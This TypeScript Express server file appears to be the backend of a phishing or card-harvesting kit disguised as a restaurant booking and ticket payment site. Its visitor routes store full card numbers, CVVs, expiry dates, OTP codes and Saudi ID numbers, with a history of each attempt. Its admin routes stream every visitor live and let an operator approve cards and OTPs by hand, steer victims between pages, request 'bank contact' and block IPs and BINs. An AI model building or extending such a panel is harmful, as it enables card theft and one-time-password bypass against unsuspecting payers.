import type { Express, Request, Response, NextFunction } from "express";
import { adminDb, adminAuth, adminRtdb, FIREBASE_WEB_API_KEY } from "./firebase-admin";
import { FieldValue } from "firebase-admin/firestore";

const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;

declare module "express-session" {
  interface SessionData {
    adminUid?: string;
    adminEmail?: string;
  }
}

/* -------------------- sanitization (mirrors old client logic) -------------------- */
const sanitizeString = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};
const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};
const sanitizePhone = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
};
const clampNumber = (value: unknown, min: number, max: number) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};
const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizePayload = (input: any) => {
  const data = { ...input };
  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") data.email = data.email.trim().toLowerCase().slice(0, 120);
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data) data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data) data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data) data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data) data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("restaurant" in data) data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data) data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data) data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data) data.bookingTime = sanitizeString(data.bookingTime, 40);
  if ("ticketQuantity" in data) data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  if ("ticketPrice" in data) data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  if ("totalAmount" in data) data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  if ("total" in data) data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  if (Array.isArray(data.cardHistory)) data.cardHistory = data.cardHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);
  if (Array.isArray(data.otpHistory)) data.otpHistory = data.otpHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);
  return data;
};

const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);

/* -------------------- helpers -------------------- */
function noStore(res: Response) {
  res.setHeader("Cache-Control", "no-store");
}

async function isVisitorBlocked(visitorId: string): Promise<boolean> {
  const db = adminDb();
  if (!db || !visitorId) return false;
  try {
    const snap = await db.collection("pays").doc(visitorId).get();
    return Boolean(snap.exists && snap.data()?.blocked);
  } catch {
    return false;
  }
}

async function isIpBlocked(ip: string): Promise<boolean> {
  const db = adminDb();
  if (!db || !ip) return false;
  try {
    const snap = await db.collection("settings").doc("blockedIps").get();
    if (!snap.exists) return false;
    const data = snap.data() as any;
    const ips: string[] = Array.isArray(data?.ips) ? data.ips.map((x: any) => String(x).trim()) : [];
    return ips.includes(ip.trim());
  } catch {
    return false;
  }
}

function getClientIp(req: Request): string {
  const fwd = req.headers["x-forwarded-for"];
  let ip = "";
  if (typeof fwd === "string") ip = fwd.split(",")[0]?.trim() || "";
  else if (Array.isArray(fwd) && fwd.length > 0) ip = String(fwd[0]).split(",")[0]?.trim();
  if (!ip) ip = (req.ip || "").trim();
  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
  return ip;
}

/* -------------------- SSE helpers -------------------- */
function openSse(res: Response) {
  res.status(200);
  res.setHeader("Content-Type", "text/event-stream; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();
}
function sseSend(res: Response, payload: unknown, event?: string) {
  if (event) res.write(`event: ${event}\n`);
  res.write(`data: ${JSON.stringify(payload)}\n\n`);
}

/* -------------------- auth middleware -------------------- */
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.adminUid) {
    return res.status(401).json({ error: "unauthorized" });
  }
  next();
}

// SSE allows cookies via EventSource(withCredentials: true) but only same-origin.
function requireAdminSse(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.adminUid) {
    res.status(401).end();
    return;
  }
  next();
}

/* -------------------- routes -------------------- */
export function registerFirebaseRoutes(app: Express) {
  /* ===== visitor writes ===== */

  // addData — accepts the same payload the old client lib accepted.
  app.post("/api/fb/visitor/data", async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });

    const payload = sanitizePayload(req.body || {});
    const visitorId = typeof payload?.id === "string" && payload.id ? payload.id : null;
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    try {
      await db.collection("pays").doc(visitorId).set(
        {
          ...payload,
          id: visitorId,
          createdDate: typeof payload.createdDate === "string" ? payload.createdDate : new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true }
      );
      return res.json({ ok: true });
    } catch (err: any) {
      console.error("[fb] addData error:", err);
      return res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // handlePay
  app.post("/api/fb/visitor/pay", async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });

    const { visitorId, paymentInfo } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    try {
      const docRef = db.collection("pays").doc(visitorId);
      const sanitized = sanitizePayload(paymentInfo || {});
      const cardEntry = sanitizeCardEntry({ ...sanitized, timestamp: new Date().toISOString() });

      const snap = await docRef.get();
      const existingHistory = Array.isArray(snap.data()?.cardHistory) ? snap.data()!.cardHistory : [];
      const nextHistory = [...existingHistory, cardEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);

      await docRef.set(
        sanitizePayload({
          ...sanitized,
          status: "pending_approval",
          cardApproved: false,
          cardStatus: "pending_approval",
          cardHistory: nextHistory,
          updatedAt: new Date().toISOString(),
        }),
        { merge: true }
      );
      return res.json({ ok: true });
    } catch (err: any) {
      console.error("[fb] handlePay error:", err);
      return res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // handleOtp
  app.post("/api/fb/visitor/otp", async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });

    const { visitorId, otp, page = "otp", history } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    const code = sanitizeDigits(otp, 6);
    if (typeof code !== "string" || code.length < 4) return res.status(400).json({ error: "invalid_otp" });

    try {
      const otpEntry = { code, timestamp: new Date().toISOString() };
      const safeHistory = Array.isArray(history) ? history : [];
      const nextOtps = [...safeHistory, otpEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);

      await db.collection("pays").doc(visitorId).set(
        sanitizePayload({
          otp: otpEntry.code,
          otpHistory: nextOtps,
          currentPage: page,
          otpApproved: false,
          otpStatus: "pending",
          updatedAt: new Date().toISOString(),
        }),
        { merge: true }
      );
      return res.json({ ok: true, otpHistory: nextOtps });
    } catch (err: any) {
      console.error("[fb] handleOtp error:", err);
      return res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // clearDirectedStep
  app.post("/api/fb/visitor/clear-step", async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.json({ ok: true });
    try {
      await db.collection("pays").doc(visitorId).set(
        { directedStep: 0, directedAt: null, updatedAt: new Date().toISOString() },
        { merge: true }
      );
      return res.json({ ok: true });
    } catch (err: any) {
      return res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // confirmBankContact
  app.post("/api/fb/visitor/bank-contact/confirm", async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });
    try {
      await db.collection("pays").doc(visitorId).set(
        {
          bankContactConfirmed: true,
          bankContactConfirmedAt: new Date().toISOString(),
          bankContactRequest: false,
          updatedAt: new Date().toISOString(),
        },
        { merge: true }
      );
      return res.json({ ok: true });
    } catch (err: any) {
      return res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // online/offline heartbeat — writes to Realtime Database /status/{id}
  app.post("/api/fb/visitor/online", async (req, res) => {
    const rtdb = adminRtdb();
    if (!rtdb) return res.json({ ok: true });
    const { visitorId, online } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });
    try {
      await rtdb.ref(`/status/${visitorId}`).set({
        online: online === false ? false : true,
        lastSeen: Date.now(),
      });
      return res.json({ ok: true });
    } catch {
      return res.json({ ok: true });
    }
  });

  // One-shot read of a visitor's own pay doc (used by /otp to render the
  // pending charge details from the previously-saved card data).
  app.get("/api/fb/visitor/:id", async (req, res) => {
    noStore(res);
    const db = adminDb();
    if (!db) return res.status(503).json({ exists: false, data: null });
    try {
      const snap = await db.collection("pays").doc(String(req.params.id)).get();
      return res.json({ exists: snap.exists, data: snap.exists ? snap.data() : null });
    } catch (err: any) {
      return res.status(500).json({ exists: false, data: null, error: err?.message });
    }
  });

  // is bin blocked? (one-shot)
  app.get("/api/fb/blocked-bin/:bin", async (req, res) => {
    noStore(res);
    const db = adminDb();
    if (!db) return res.json({ blocked: false });
    const bin = normalizeBin(req.params.bin);
    if (bin.length < 6) return res.json({ blocked: false });
    try {
      const snap = await db.collection("blocked_bins").doc(bin).get();
      return res.json({ blocked: snap.exists });
    } catch {
      return res.json({ blocked: false });
    }
  });

  /* ===== visitor SSE streams ===== */

  // One per-visitor SSE stream that emits the visitor doc (used by the client
  // shim to drive listenForApproval / listenForOtpApproval / listenForDirectedStep
  // / listenForBankContactRequest / listenForVisitorBlock locally).
  app.get("/api/fb/stream/visitor/:id", (req, res) => {
    const db = adminDb();
    if (!db) {
      res.status(503).end();
      return;
    }
    openSse(res);
    sseSend(res, { ready: true }, "ready");
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);
    const unsub = db.collection("pays").doc(String(req.params.id)).onSnapshot(
      (snap) => {
        sseSend(res, { exists: snap.exists, data: snap.exists ? snap.data() : null });
      },
      (err) => {
        console.error("[fb] visitor SSE error:", err);
        sseSend(res, { error: String(err?.message || err) }, "error");
      }
    );
    req.on("close", () => {
      clearInterval(ka);
      try { unsub(); } catch {}
    });
  });

  // settings/blockedIps SSE — emits the array of blocked IPs.
  app.get("/api/fb/stream/blocked-ips", (req, res) => {
    const db = adminDb();
    if (!db) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);
    const unsub = db.collection("settings").doc("blockedIps").onSnapshot((snap) => {
      const data = snap.data() as any;
      const ips: string[] = Array.isArray(data?.ips) ? data.ips.map((x: any) => String(x).trim()).filter(Boolean) : [];
      sseSend(res, { ips });
    });
    req.on("close", () => { clearInterval(ka); try { unsub(); } catch {} });
  });

  // blocked_bins collection SSE
  app.get("/api/fb/stream/blocked-bins", (req, res) => {
    const db = adminDb();
    if (!db) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);
    const unsub = db.collection("blocked_bins").onSnapshot((snap) => {
      const list: any[] = [];
      snap.forEach((d) => list.push({ bin: d.id, ...(d.data() as any) }));
      sseSend(res, { bins: list });
    });
    req.on("close", () => { clearInterval(ka); try { unsub(); } catch {} });
  });

  /* ===== admin auth ===== */

  // Login: verify the password against Firebase Auth via the Identity Toolkit
  // REST API (the Admin SDK can't verify passwords). On success, mint a
  // session cookie.
  app.post("/api/fb/admin/login", async (req, res) => {
    const { email, password } = req.body || {};
    if (typeof email !== "string" || typeof password !== "string" || !email || !password) {
      return res.status(400).json({ error: "invalid_request" });
    }
    if (!FIREBASE_WEB_API_KEY) {
      return res.status(503).json({ error: "auth_unavailable" });
    }
    try {
      const r = await fetch(
        `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${encodeURIComponent(FIREBASE_WEB_API_KEY)}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password, returnSecureToken: true }),
        }
      );
      const json: any = await r.json();
      if (!r.ok || !json?.localId) {
        const code = String(json?.error?.message || "INVALID");
        let mapped = "invalid_credential";
        if (code.includes("EMAIL_NOT_FOUND")) mapped = "user_not_found";
        else if (code.includes("INVALID_PASSWORD") || code.includes("INVALID_LOGIN_CREDENTIALS")) mapped = "wrong_password";
        else if (code.includes("USER_DISABLED")) mapped = "user_disabled";
        return res.status(401).json({ error: mapped });
      }
      req.session.adminUid = json.localId;
      req.session.adminEmail = json.email || email;
      req.session.save(() => {
        res.json({ uid: json.localId, email: json.email || email });
      });
    } catch (err: any) {
      console.error("[fb] admin login error:", err);
      return res.status(500).json({ error: "login_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/logout", (req, res) => {
    req.session?.destroy(() => {
      res.clearCookie("connect.sid");
      res.json({ ok: true });
    });
  });

  app.get("/api/fb/admin/me", (req, res) => {
    noStore(res);
    if (!req.session?.adminUid) return res.json({ user: null });
    res.json({ user: { uid: req.session.adminUid, email: req.session.adminEmail || "" } });
  });

  /* ===== admin writes ===== */

  app.post("/api/fb/admin/visitor/:id/approval", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const approved = !!req.body?.approved;
    try {
      await db.collection("pays").doc(String(req.params.id)).update({
        cardApproved: approved,
        cardStatus: approved ? "approved" : "rejected",
        status: approved ? "approved" : "rejected",
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/otp-approval", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const approved = !!req.body?.approved;
    try {
      await db.collection("pays").doc(String(req.params.id)).update({
        otpApproved: approved,
        otpStatus: approved ? "approved" : "rejected",
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/block", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const blocked = !!req.body?.blocked;
    try {
      const payload: Record<string, unknown> = {
        blocked,
        blockedAt: blocked ? new Date().toISOString() : null,
      };
      if (blocked) payload.online = false;
      await db.collection("pays").doc(String(req.params.id)).set(payload, { merge: true });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/bank-contact", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    try {
      await db.collection("pays").doc(String(req.params.id)).set(
        {
          bankContactRequest: true,
          bankContactAt: new Date().toISOString(),
          bankContactConfirmed: false,
          bankContactConfirmedAt: null,
          updatedAt: new Date().toISOString(),
        },
        { merge: true }
      );
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  // Generic merge update (used by dashboard's pushDirective + setApprovalStatus tracking fields).
  app.post("/api/fb/admin/visitor/:id/merge", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const patch = req.body?.patch;
    if (!patch || typeof patch !== "object") return res.status(400).json({ error: "invalid_patch" });
    try {
      await db.collection("pays").doc(String(req.params.id)).set(
        { ...patch, updatedAt: new Date().toISOString() },
        { merge: true }
      );
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.delete("/api/fb/admin/visitor/:id", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    try {
      // Preserve IP block if visitor was blocked.
      const docRef = db.collection("pays").doc(String(req.params.id));
      const snap = await docRef.get();
      if (snap.exists) {
        const data = snap.data() as any;
        const wasBlocked = data?.blocked === true;
        const ip = String(data?.ip || data?.ipAddress || "").trim();
        if (wasBlocked && ip) {
          await db.collection("settings").doc("blockedIps").set(
            { ips: FieldValue.arrayUnion(ip), updatedAt: new Date().toISOString() },
            { merge: true }
          );
        }
      }
      await docRef.delete();
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });

  app.delete("/api/fb/admin/visitors", requireAdmin, async (_req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    try {
      const snap = await db.collection("pays").get();
      const docs = snap.docs;
      for (let i = 0; i < docs.length; i += 450) {
        const batch = db.batch();
        docs.slice(i, i + 450).forEach((d) => batch.delete(d.ref));
        await batch.commit();
      }
      res.json({ ok: true, deleted: docs.length });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-ips/add", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    try {
      await db.collection("settings").doc("blockedIps").set(
        { ips: FieldValue.arrayUnion(ip), updatedAt: new Date().toISOString() },
        { merge: true }
      );
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-ips/remove", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    try {
      await db.collection("settings").doc("blockedIps").set(
        { ips: FieldValue.arrayRemove(ip), updatedAt: new Date().toISOString() },
        { merge: true }
      );
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-bins/add", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (bin.length !== 6) return res.status(400).json({ error: "invalid_bin" });
    const meta = req.body?.meta || {};
    try {
      await db.collection("blocked_bins").doc(bin).set({
        bin,
        blockedAt: new Date().toISOString(),
        ...(typeof meta === "object" ? meta : {}),
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-bins/remove", requireAdmin, async (req, res) => {
    const db = adminDb();
    if (!db) return res.status(503).json({ error: "firebase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (!bin) return res.status(400).json({ error: "invalid_bin" });
    try {
      await db.collection("blocked_bins").doc(bin).delete();
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });

  /* ===== admin streams ===== */

  // Full pays collection SSE for the dashboard.
  app.get("/api/fb/admin/stream/visitors", requireAdminSse, (req, res) => {
    const db = adminDb();
    if (!db) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);
    const unsub = db.collection("pays").onSnapshot(
      (snap) => {
        const list: any[] = [];
        snap.forEach((d) => list.push({ id: d.id, ...(d.data() as any) }));
        sseSend(res, { visitors: list });
      },
      (err) => {
        console.error("[fb] admin visitors SSE error:", err);
        sseSend(res, { error: String(err?.message || err) }, "error");
      }
    );
    req.on("close", () => { clearInterval(ka); try { unsub(); } catch {} });
  });

  // Realtime Database online-status SSE for the dashboard.
  app.get("/api/fb/admin/stream/online-status", requireAdminSse, (req, res) => {
    const rtdb = adminRtdb();
    if (!rtdb) { res.status(503).end(); return; }
    openSse(res);
    const ka = setInterval(() => res.write(": keep-alive\n\n"), 25_000);
    const ref = rtdb.ref("/status");
    const handler = ref.on(
      "value",
      (snap) => {
        const statuses: Record<string, { online: boolean; lastSeen: number }> = {};
        snap.forEach((child) => {
          const v = child.val() || {};
          statuses[child.key as string] = {
            online: v.online === true,
            lastSeen: typeof v.lastSeen === "number" ? v.lastSeen : 0,
          };
          return false;
        });
        sseSend(res, { statuses });
      },
      (err) => {
        console.error("[fb] online-status SSE error:", err);
        sseSend(res, { error: String((err as any)?.message || err) }, "error");
      }
    );
    req.on("close", () => {
      clearInterval(ka);
      try { ref.off("value", handler); } catch {}
    });
  });
}
